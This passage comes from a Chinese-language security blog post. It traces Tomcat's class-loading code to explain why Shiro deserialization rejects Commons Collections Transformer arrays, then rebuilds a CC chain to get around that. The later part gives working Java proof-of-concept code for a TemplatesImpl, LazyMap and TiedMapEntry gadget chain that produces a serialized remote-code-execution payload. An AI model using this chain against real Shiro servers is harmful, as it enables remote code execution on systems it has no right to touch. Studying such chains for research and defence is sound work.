<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">boolean delegateLoad = delegate || filter(name, true);</span><br></pre></td></tr></table></figure></div>

<p>的结果为真则会先调用父类加载器进行加载，走双亲委派模型，也就是调用 Class.forName，如果结果为false则不走双亲委派模型，先调用自己的类加载器也就是调用findclass，如果加载不到才会调用父类加载器。</p>
<p>我们这里跟进到filter分析一下判断机制</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected boolean filter(String name, boolean isClassName) &#123;</span><br><span class="line"></span><br><span class="line">        if (name == null)</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        char ch;</span><br><span class="line">        if (name.startsWith(&quot;javax&quot;)) &#123;</span><br><span class="line">            /* 5 == length(&quot;javax&quot;) */</span><br><span class="line">            if (name.length() == 5) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            ch = name.charAt(5);</span><br><span class="line">            if (isClassName &amp;&amp; ch == &#x27;.&#x27;) &#123;</span><br><span class="line">                /* 6 == length(&quot;javax.&quot;) */</span><br><span class="line">                if (name.startsWith(&quot;servlet.jsp.jstl.&quot;, 6)) &#123;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">                if (name.startsWith(&quot;el.&quot;, 6) ||</span><br><span class="line">                    name.startsWith(&quot;servlet.&quot;, 6) ||</span><br><span class="line">                    name.startsWith(&quot;websocket.&quot;, 6) ||</span><br><span class="line">                    name.startsWith(&quot;security.auth.message.&quot;, 6)) &#123;</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else if (!isClassName &amp;&amp; ch == &#x27;/&#x27;) &#123;</span><br><span class="line">                /* 6 == length(&quot;javax/&quot;) */</span><br><span class="line">                if (name.startsWith(&quot;servlet/jsp/jstl/&quot;, 6)) &#123;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">                if (name.startsWith(&quot;el/&quot;, 6) ||</span><br><span class="line">                    name.startsWith(&quot;servlet/&quot;, 6) ||</span><br><span class="line">                    name.startsWith(&quot;websocket/&quot;, 6) ||</span><br><span class="line">                    name.startsWith(&quot;security/auth/message/&quot;, 6)) &#123;</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (name.startsWith(&quot;org&quot;)) &#123;</span><br><span class="line">            /* 3 == length(&quot;org&quot;) */</span><br><span class="line">            if (name.length() == 3) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            ch = name.charAt(3);</span><br><span class="line">            if (isClassName &amp;&amp; ch == &#x27;.&#x27;) &#123;</span><br><span class="line">                /* 4 == length(&quot;org.&quot;) */</span><br><span class="line">                if (name.startsWith(&quot;apache.&quot;, 4)) &#123;</span><br><span class="line">                    /* 11 == length(&quot;org.apache.&quot;) */</span><br><span class="line">                    if (name.startsWith(&quot;tomcat.jdbc.&quot;, 11)) &#123;</span><br><span class="line">                        return false;</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (name.startsWith(&quot;el.&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;catalina.&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;jasper.&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;juli.&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;tomcat.&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;naming.&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;coyote.&quot;, 11)) &#123;</span><br><span class="line">                        return true;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else if (!isClassName &amp;&amp; ch == &#x27;/&#x27;) &#123;</span><br><span class="line">                /* 4 == length(&quot;org/&quot;) */</span><br><span class="line">                if (name.startsWith(&quot;apache/&quot;, 4)) &#123;</span><br><span class="line">                    /* 11 == length(&quot;org/apache/&quot;) */</span><br><span class="line">                    if (name.startsWith(&quot;tomcat/jdbc/&quot;, 11)) &#123;</span><br><span class="line">                        return false;</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (name.startsWith(&quot;el/&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;catalina/&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;jasper/&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;juli/&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;tomcat/&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;naming/&quot;, 11) ||</span><br><span class="line">                        name.startsWith(&quot;coyote/&quot;, 11)) &#123;</span><br><span class="line">                        return true;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>然后这里根据分析代码和网上一些师傅的文章</p>
<p>如果这里不是tomcat自己的lib或者classes类的话是可以加载成功的，也就是返回结果为真，调用Class.forName进行加载</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013194754937.png"
                      alt="image-20231013194754937"
                ></p>
<p>但是我们要加载的commons-collections类明显是在tomcat下面的web-INF lib下面也就是用webappclassloader进行加载</p>
<p>所以这里 filter返回的结果是为假的</p>
<p>所以也就是说这里是不走双亲委派机制的，先调用自己的类加载器，也就是调用findclass进行加载，然后在调用父类的class.forname进行加载。</p>
<p>所以这里也就是调用findclass进行加载</p>
<p>我们这里跟进到findclass分析一些：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        if (log.isDebugEnabled())</span><br><span class="line">            log.debug(&quot;    findClass(&quot; + name + &quot;)&quot;);</span><br><span class="line"></span><br><span class="line">        checkStateForClassLoading(name);</span><br><span class="line"></span><br><span class="line">        // (1) Permission to define this class when using a SecurityManager</span><br><span class="line">        if (securityManager != null) &#123;</span><br><span class="line">            int i = name.lastIndexOf(&#x27;.&#x27;);</span><br><span class="line">            if (i &gt;= 0) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    if (log.isTraceEnabled())</span><br><span class="line">                        log.trace(&quot;      securityManager.checkPackageDefinition&quot;);</span><br><span class="line">                    securityManager.checkPackageDefinition(name.substring(0,i));</span><br><span class="line">                &#125; catch (Exception se) &#123;</span><br><span class="line">                    if (log.isTraceEnabled())</span><br><span class="line">                        log.trace(&quot;      --&gt;Exception--&gt;ClassNotFoundException&quot;, se);</span><br><span class="line">                    throw new ClassNotFoundException(name, se);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Ask our superclass to locate this class, if possible</span><br><span class="line">        // (throws ClassNotFoundException if it is not found)</span><br><span class="line">        Class&lt;?&gt; clazz = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (log.isTraceEnabled())</span><br><span class="line">                log.trace(&quot;      findClassInternal(&quot; + name + &quot;)&quot;);</span><br><span class="line">            try &#123;</span><br><span class="line">                if (securityManager != null) &#123;</span><br><span class="line">                    PrivilegedAction&lt;Class&lt;?&gt;&gt; dp =</span><br><span class="line">                        new PrivilegedFindClassByName(name);</span><br><span class="line">                    clazz = AccessController.doPrivileged(dp);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    clazz = findClassInternal(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch(AccessControlException ace) &#123;</span><br><span class="line">                log.warn(sm.getString(&quot;webappClassLoader.securityException&quot;, name,</span><br><span class="line">                        ace.getMessage()), ace);</span><br><span class="line">                throw new ClassNotFoundException(name, ace);</span><br><span class="line">            &#125; catch (RuntimeException e) &#123;</span><br><span class="line">                if (log.isTraceEnabled())</span><br><span class="line">                    log.trace(&quot;      --&gt;RuntimeException Rethrown&quot;, e);</span><br><span class="line">                throw e;</span><br><span class="line">            &#125;</span><br><span class="line">            if ((clazz == null) &amp;&amp; hasExternalRepositories) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    clazz = super.findClass(name);</span><br><span class="line">                &#125; catch(AccessControlException ace) &#123;</span><br><span class="line">                    log.warn(sm.getString(&quot;webappClassLoader.securityException&quot;, name,</span><br><span class="line">                            ace.getMessage()), ace);</span><br><span class="line">                    throw new ClassNotFoundException(name, ace);</span><br><span class="line">                &#125; catch (RuntimeException e) &#123;</span><br><span class="line">                    if (log.isTraceEnabled())</span><br><span class="line">                        log.trace(&quot;      --&gt;RuntimeException Rethrown&quot;, e);</span><br><span class="line">                    throw e;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (clazz == null) &#123;</span><br><span class="line">                if (log.isDebugEnabled())</span><br><span class="line">                    log.debug(&quot;    --&gt; Returning ClassNotFoundException&quot;);</span><br><span class="line">                throw new ClassNotFoundException(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            if (log.isTraceEnabled())</span><br><span class="line">                log.trace(&quot;    --&gt; Passing on ClassNotFoundException&quot;);</span><br><span class="line">            throw e;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Return the class we have located</span><br><span class="line">        if (log.isTraceEnabled())</span><br><span class="line">            log.debug(&quot;      Returning class &quot; + clazz);</span><br><span class="line"></span><br><span class="line">        if (log.isTraceEnabled()) &#123;</span><br><span class="line">            ClassLoader cl;</span><br><span class="line">            if (Globals.IS_SECURITY_ENABLED)&#123;</span><br><span class="line">                cl = AccessController.doPrivileged(</span><br><span class="line">                    new PrivilegedGetClassLoader(clazz));</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                cl = clazz.getClassLoader();</span><br><span class="line">            &#125;</span><br><span class="line">            log.debug(&quot;      Loaded by &quot; + cl.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        return clazz;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>我们对上面的代码进行分析可以知道调用<code>findClassInternal(name)</code>这是自定义类加载器的一个内部方法，尝试查找和加载指定名称的类。其实也就是调用自己的类加载方法进行加载。</p>
<p>如果前面无法加载类，代码会尝试通过 <code>super.findClass(name)</code> 来委托给父类加载器加载类。这也是为了确保加载的一致性，符合类加载的双亲委派模型。</p>
<p>我们这里跟进到findClassInternal(name)方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected Class&lt;?&gt; findClassInternal(String name) &#123;</span><br><span class="line"></span><br><span class="line">    checkStateForResourceLoading(name);</span><br><span class="line"></span><br><span class="line">    if (name == null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    String path = binaryNameToPath(name, true);</span><br><span class="line"></span><br><span class="line">    ResourceEntry entry = resourceEntries.get(path);</span><br><span class="line">    WebResource resource = null;</span><br><span class="line"></span><br><span class="line">    if (entry == null) &#123;</span><br><span class="line">        resource = resources.getClassLoaderResource(path);</span><br><span class="line"></span><br><span class="line">        if (!resource.exists()) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        entry = new ResourceEntry();</span><br><span class="line">        entry.lastModified = resource.getLastModified();</span><br><span class="line"></span><br><span class="line">        // Add the entry in the local resource repository</span><br><span class="line">        synchronized (resourceEntries) &#123;</span><br><span class="line">            // Ensures that all the threads which may be in a race to load</span><br><span class="line">            // a particular class all end up with the same ResourceEntry</span><br><span class="line">            // instance</span><br><span class="line">            ResourceEntry entry2 = resourceEntries.get(path);</span><br><span class="line">            if (entry2 == null) &#123;</span><br><span class="line">                resourceEntries.put(path, entry);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                entry = entry2;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = entry.loadedClass;</span><br><span class="line">    if (clazz != null)</span><br><span class="line">        return clazz;</span><br><span class="line"></span><br><span class="line">    synchronized (getClassLoadingLock(name)) &#123;</span><br><span class="line">        clazz = entry.loadedClass;</span><br><span class="line">        if (clazz != null)</span><br><span class="line">            return clazz;</span><br><span class="line"></span><br><span class="line">        if (resource == null) &#123;</span><br><span class="line">            resource = resources.getClassLoaderResource(path);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (!resource.exists()) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        byte[] binaryContent = resource.getContent();</span><br><span class="line">        if (binaryContent == null) &#123;</span><br><span class="line">            // Something went wrong reading the class bytes (and will have</span><br><span class="line">            // been logged at debug level).</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        Manifest manifest = resource.getManifest();</span><br><span class="line">        URL codeBase = resource.getCodeBase();</span><br><span class="line">        Certificate[] certificates = resource.getCertificates();</span><br><span class="line"></span><br><span class="line">        if (transformers.size() &gt; 0) &#123;</span><br><span class="line">            // If the resource is a class just being loaded, decorate it</span><br><span class="line">            // with any attached transformers</span><br><span class="line"></span><br><span class="line">            // Ignore leading &#x27;/&#x27; and trailing CLASS_FILE_SUFFIX</span><br><span class="line">            // Should be cheaper than replacing &#x27;.&#x27; by &#x27;/&#x27; in class name.</span><br><span class="line">            String internalName = path.substring(1, path.length() - CLASS_FILE_SUFFIX.length());</span><br><span class="line"></span><br><span class="line">            for (ClassFileTransformer transformer : this.transformers) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    byte[] transformed = transformer.transform(</span><br><span class="line">                            this, internalName, null, null, binaryContent);</span><br><span class="line">                    if (transformed != null) &#123;</span><br><span class="line">                        binaryContent = transformed;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (IllegalClassFormatException e) &#123;</span><br><span class="line">                    log.error(sm.getString(&quot;webappClassLoader.transformError&quot;, name), e);</span><br><span class="line">                    return null;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Looking up the package</span><br><span class="line">        String packageName = null;</span><br><span class="line">        int pos = name.lastIndexOf(&#x27;.&#x27;);</span><br><span class="line">        if (pos != -1)</span><br><span class="line">            packageName = name.substring(0, pos);</span><br><span class="line"></span><br><span class="line">        Package pkg = null;</span><br><span class="line"></span><br><span class="line">        if (packageName != null) &#123;</span><br><span class="line">            pkg = getPackage(packageName);</span><br><span class="line">            // Define the package (if null)</span><br><span class="line">            if (pkg == null) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    if (manifest == null) &#123;</span><br><span class="line">                        definePackage(packageName, null, null, null, null, null, null, null);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        definePackage(packageName, manifest, codeBase);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (IllegalArgumentException e) &#123;</span><br><span class="line">                    // Ignore: normal error due to dual definition of package</span><br><span class="line">                &#125;</span><br><span class="line">                pkg = getPackage(packageName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (securityManager != null) &#123;</span><br><span class="line"></span><br><span class="line">            // Checking sealing</span><br><span class="line">            if (pkg != null) &#123;</span><br><span class="line">                boolean sealCheck = true;</span><br><span class="line">                if (pkg.isSealed()) &#123;</span><br><span class="line">                    sealCheck = pkg.isSealed(codeBase);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    sealCheck = (manifest == null) || !isPackageSealed(packageName, manifest);</span><br><span class="line">                &#125;</span><br><span class="line">                if (!sealCheck)</span><br><span class="line">                    throw new SecurityException</span><br><span class="line">                        (&quot;Sealing violation loading &quot; + name + &quot; : Package &quot;</span><br><span class="line">                         + packageName + &quot; is sealed.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            clazz = defineClass(name, binaryContent, 0,</span><br><span class="line">                    binaryContent.length, new CodeSource(codeBase, certificates));</span><br><span class="line">        &#125; catch (UnsupportedClassVersionError ucve) &#123;</span><br><span class="line">            throw new UnsupportedClassVersionError(</span><br><span class="line">                    ucve.getLocalizedMessage() + &quot; &quot; +</span><br><span class="line">                    sm.getString(&quot;webappClassLoader.wrongVersion&quot;,</span><br><span class="line">                            name));</span><br><span class="line">        &#125;</span><br><span class="line">        entry.loadedClass = clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们跟进调试一下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013212846905.png"
                      alt="image-20231013212846905"
                ></p>
<p>可以看到在findClassInternal中会调用 binaryNameToPath()方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">String path = binaryNameToPath(name, true);：</span><br><span class="line">代码将类名转换为一个路径，通常用于定位类文件的资源路径。这可能会涉及到将类名中的包名分隔符（&quot;.&quot;）替换为文件路径分隔符（&quot;/&quot;）。</span><br></pre></td></tr></table></figure></div>

<p>那么binaryNameToPath()主要就是将类名转换为一个路径</p>
<p>我们跟进到这个方法里面看一下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013212804709.png"
                      alt="image-20231013212804709"
                ></p>
<p>可以看到在转换的过程中，这个方法在原来的类名后面加了一个.class</p>
<p>那么最终查找的类的路径变为了&#x2F;[Lorg&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;Transformer;.class</p>
<p>但是我们可以看一下日志信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013213313733.png"
                      alt="image-20231013213313733"
                ></p>
<p>在我们日志中打印了我们要加载的类是&#x2F;[Lorg&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;Transformer;，但是在经过binaryNameToPath()方法转换后在末尾加了一个.class，这导致tomcat在调用自己的类加载器方法在web-INF进行查找加载的时候无法加载成功，因为根据binaryNameToPath转换的路径根本没有办法正常查找到类进行加载。</p>
<p>那么我们上面说了当tomcat自己的类加载器无法加载成功的时候，会调用父类加载器进行加载也就是class.forName，但是我们要加载类在tomcat的自己的类，也就是web-INF里面的类，这导致classforName是无法加载成功的。</p>
<p>这也就导致了shiro无法正常加载transform数组的原因。</p>
<p>那么根据我们上面的分析和对一些师傅文章的学习，我们大概可以得到一个结论如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。关于这个结论我们根据上面的分析也就很好理解了。tomcat的类加载机制导致先调用自身的类加载器进行加载，也就是调用findclass，但是在binaryNameToPath()转换下在末尾添加了一个.class，导致类加载器在web—INF中加载不到。但是如果是java自身数组，也就是jdk里面的，那么可以通过classforname也就是通过classloader进行加载，这样是可以正常加载的。</p>
<h1 id="三、CC链改装"><a href="#三、CC链改装" class="headerlink" title="三、CC链改装"></a>三、CC链改装</h1><p>上面我们分析了shiro为什么无法正常打CC依赖的原因，也就是使用了transform数组，那我们想要正常的打cc依赖，就要在构造POC的时候不使用transform数组。那我们就需要改装我们的CC链：</p>
<p>那我们这里的最终目的就是构造一个不需要使用transform数组的利用链，我们这里先看一下我们前面分析的几条CC链：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017163330119.png"
                      alt="image-20231017163330119"
                ></p>
<p>根据上面这个利用链图我们可以知道最终执行命令的就两种方法，一种是直接runtime进行命令执行，另一种就是动态加载字节码</p>
<p>但是如果我们要使用runtime进行命令执行的话，在我们前面分析的几条链中，都会使用到invokertransfrom，那这样必然会用到transform数组。</p>
<p>所以我们这里可以使用动态加载字节码来来进行利用：</p>
<p>那我们这里先回忆一下利用TemplatesIMPI加载字节码的利用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; </span><br><span class="line">TemplatesImpl#defineTransletClasses()-&gt; </span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure></div>

<p>然后我们这里CC2中是通invokerTransformer的transform方法去调用TemplatesImpl的newTransform方法进而调用后续利用链</p>
<p>事实上我们在前面分析的CC2的第二条链中就是没有使用到transform数组。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class CC22 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.setProperty(&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;, &quot;true&quot;);</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">         setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        InvokerTransformer invokerTransformer=new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);</span><br><span class="line">        TransformingComparator transformingComparator =new TransformingComparator(new ConstantTransformer(1));</span><br><span class="line">        PriorityQueue priorityQueue=new PriorityQueue(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        Class c= transformingComparator.getClass();</span><br><span class="line">        Field transformField=c.getDeclaredField(&quot;transformer&quot;);</span><br><span class="line">        transformField.setAccessible(true);</span><br><span class="line">        transformField.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serializable(priorityQueue);</span><br><span class="line">        unserializable();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void serializable(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反序列化</span><br><span class="line">    public static void unserializable() throws Exception &#123;</span><br><span class="line">        ObjectInputStream out = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        out.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但是用到了TransformingComparator，但是TransformingComparator在cc4.0中继承了序列化接口，但是在cc3.2.1中是没有继承的导致在CC3.2.1中不能序列化，那我们就不能在这里打这条链。</p>
<p>但是根据上面的利用链图我们可以看到除了TransformingComparator调用invoker的transform方法，就只有chaintranformer方法，但是明显这个是不能使用的，因为我们这里使用chaintransformer就会用到transform方法。</p>
<p>那我们这里就要使用其他的类去调用到transform方法</p>
<p>然后我们这里可以想到在CommonsCollections6中用到了一个类TiedMapEntry，我们使用他的getvalue方法去触发Lazymap的get方法</p>
<p>我们这里先看一下Lazymap的get方法：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public Object get(Object key) &#123;</span><br><span class="line">// create value for key if key is not currently in the map</span><br><span class="line">if (map.containsKey(key) == false) &#123;</span><br><span class="line">Object value = factory.transform(key);</span><br><span class="line">map.put(key, value);</span><br><span class="line">return value;</span><br><span class="line">&#125;</span><br><span class="line">return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们可以看到在Lazymap的get方法中调用了transform，那么如果这里factory是可控的，我们只用将factory复制为invokertransform类，然后就可以触发transform方法，进而触发后续利用类进行动态类加载字节码。</p>
<p>但是这个前提是factory是可控的，在我们前面在CC6的分析中我们知道这个factory是可控的</p>
<p>我们这里简单回顾一下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017173312082.png"
                      alt="image-20231017173312082"
                ></p>
<p>可以看到Lazymap的构造方法是一个受保护的方法</p>
<p>我们不能直接调用，但是我们在一个静态方法decorate返回了lazymap的构造方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017173734152.png"
                      alt="image-20231017173734152"
                ></p>
<p>那么我们可以看到这个factory的值也是可控的</p>
<p>我们只需要调用decorate方法就可以控制factory变量的值了</p>
<p>其实这里就和CC6一样了</p>
<p>然后再通过TiedMapEntry的getvalue方法触发lazymap的get方法</p>
<p>后面的就是CC6的东西了，使用hashmap或者hashset方法触发TiedMapEntry的hashcode方法进而触发getvalue方法进而触发后续利用链。</p>
<p>那我们这里就可以编写POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.HashSet;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class ccshiro &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.setProperty(&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;, &quot;true&quot;);</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        InvokerTransformer invokerTransformer=new InvokerTransformer(&quot;newTransformer&quot;,null,null);</span><br><span class="line">        Map hashMap = new HashMap();</span><br><span class="line">        Map lazymap = LazyMap.decorate(hashMap, new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = new TiedMapEntry(lazymap,  templates);</span><br><span class="line"></span><br><span class="line">        Map expMap = new HashMap();</span><br><span class="line">        expMap.put(tme, &quot;valuevalue&quot;);</span><br><span class="line">        lazymap.remove(templates);</span><br><span class="line"></span><br><span class="line">        Class c= LazyMap.class;</span><br><span class="line">        Field factoryField=c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factoryField.setAccessible(true);</span><br><span class="line">        factoryField.set(lazymap,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serializable(expMap);</span><br><span class="line">       unserializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    